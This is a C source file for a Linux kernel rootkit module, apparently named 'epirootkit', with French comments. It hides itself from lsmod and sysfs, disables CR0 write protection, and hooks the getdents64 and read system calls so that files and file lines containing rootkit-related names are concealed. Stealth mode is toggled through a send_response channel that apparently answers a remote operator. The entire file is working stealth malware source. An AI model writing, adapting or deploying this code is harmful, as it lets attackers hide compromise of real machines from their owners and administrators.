#include "rootkit.h"
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

// Variables pour les hooks
static int hooks_installed = 0;
static unsigned long *sys_call_table = NULL;
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_read)(const struct pt_regs *);

// Désactiver la protection en écriture des pages mémoire
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | 0x10000);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & ~0x10000);
}

// Cacher le module de la liste lsmod
void hide_module(void) {
    if (hidden) return;
    
    printk(KERN_INFO "[ROOTKIT] Hiding module from lists\n");
    
    prev_module = THIS_MODULE->list.prev;
    
    list_del(&THIS_MODULE->list);
 
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    hidden = 1;
    printk(KERN_INFO "[ROOTKIT] Module hidden successfully\n");
}

// Rendre le module visible dans lsmod
void show_module(void) {
    if (!hidden) return;
    
    printk(KERN_INFO "[ROOTKIT] Revealing module\n");
    
    list_add(&THIS_MODULE->list, prev_module);
    
    hidden = 0;
    printk(KERN_INFO "[ROOTKIT] Module revealed\n");
}

// Intercepter la fonction ls pour cacher nos fichiers
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *dir_entry, *previous_dir = NULL;
    unsigned long offset = 0;
    long ret;
    
    ret = original_getdents64(regs);
    if (ret <= 0) return ret;

    current_dir = kzalloc(ret, GFP_KERNEL);
    if (current_dir == NULL) return ret;

    if (copy_from_user(current_dir, dirent, ret)) {
        kfree(current_dir);
        return ret;
    }

    dir_entry = current_dir;
    
    while (offset < ret) {
        if (strstr(dir_entry->d_name, "rootkit") ||
            strstr(dir_entry->d_name, "epirootkit") ||
            strstr(dir_entry->d_name, "rk_conn") ||
            strstr(dir_entry->d_name, "rootkit_out")) {
            
            
            if (previous_dir) {
                previous_dir->d_reclen += dir_entry->d_reclen;
            } else {
                ret -= dir_entry->d_reclen;
                memmove(dir_entry, (char *)dir_entry + dir_entry->d_reclen, 
                       ret - offset);
                continue;
            }
        } else {
            previous_dir = dir_entry;
        }
        
        offset += dir_entry->d_reclen;
        dir_entry = (struct linux_dirent64 *)((char *)dir_entry + dir_entry->d_reclen);
    }

    if (copy_to_user(dirent, current_dir, ret)) {
        kfree(current_dir);
        return ret;
    }

    kfree(current_dir);
    return ret;
}

// Intercepter la lecture de fichiers pour cacher nos lignes
static asmlinkage long hooked_read(const struct pt_regs *regs) {
    char __user *buf = (char __user *)regs->si;
    long ret;
    char *kernel_buf, *line, *next_line, *clean_buf;
    int clean_len = 0;
    int should_filter = 0;
    
    ret = original_read(regs);
    if (ret <= 0 | ret > 65536) return ret;

    kernel_buf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kernel_buf) return ret;

    if (copy_from_user(kernel_buf, buf, ret)) {
        kfree(kernel_buf);
        return ret;
    }

    kernel_buf[ret] = '\0';

    if (strchr(kernel_buf, '\n') && 
        (strstr(kernel_buf, "rootkit") || strstr(kernel_buf, "epirootkit") || strstr(kernel_buf, "rk_conn"))) {
        should_filter = 1;
    }

    if (!should_filter) {
        kfree(kernel_buf);
        return ret;
    }

    clean_buf = kzalloc(ret + 1, GFP_KERNEL);
    if (!clean_buf) {
        kfree(kernel_buf);
        return ret;
    }

    line = kernel_buf;

    while (line && (line - kernel_buf) < ret) {
        next_line = strchr(line, '\n');
        if (next_line) {
            *next_line = '\0';
            next_line++;
        }

        if (!strstr(line, "rootkit") && 
            !strstr(line, "epirootkit")) {
            
            int line_len = strlen(line);
            if (clean_len + line_len + 1 < ret) {
                memcpy(clean_buf + clean_len, line, line_len);
                clean_len += line_len;
                if (next_line && (next_line - kernel_buf) <= ret) {
                    clean_buf[clean_len++] = '\n';
                }
            }
        }

        line = next_line;
    }

    if (copy_to_user(buf, clean_buf, clean_len) == 0) {
        ret = clean_len;
    }

    kfree(kernel_buf);
    kfree(clean_buf);
    return ret;
}

// Installer nos interceptions dans le système
int install_syscall_hooks(void) {
    if (hooks_installed) {
        return 0;
    }

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -1;
    }

    unprotect_memory();

    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_read = (void *)sys_call_table[__NR_read];

    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_read] = (unsigned long)hooked_read;

    protect_memory();

    hooks_installed = 1;
    return 0;
}

// Supprimer nos interceptions du système
void remove_syscall_hooks(void) {
    if (!hooks_installed || !sys_call_table) {
        return;
    }

    unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;

    protect_memory();

    hooks_installed = 0;
}

// Activer le mode furtif complet
void enable_advanced_hiding(void) {
    if (hooks_installed) {
        send_response("[INFO] Advanced hiding already enabled\n");
        return;
    }
    
    if (install_syscall_hooks() == 0) {
        hooks_installed = 1;
        send_response("[INFO] Advanced hiding enabled - files/lines now hidden\n");
    } else {
        send_response("[ERROR] Failed to enable advanced hiding\n");
    }
}

// Désactiver le mode furtif complet
void disable_advanced_hiding(void) {
    if (!hooks_installed) {
        send_response("[INFO] Advanced hiding already disabled\n");
        return;
    }
    
    remove_syscall_hooks();
    hooks_installed = 0;
    send_response("[INFO] Advanced hiding disabled - files/lines visible again\n");
}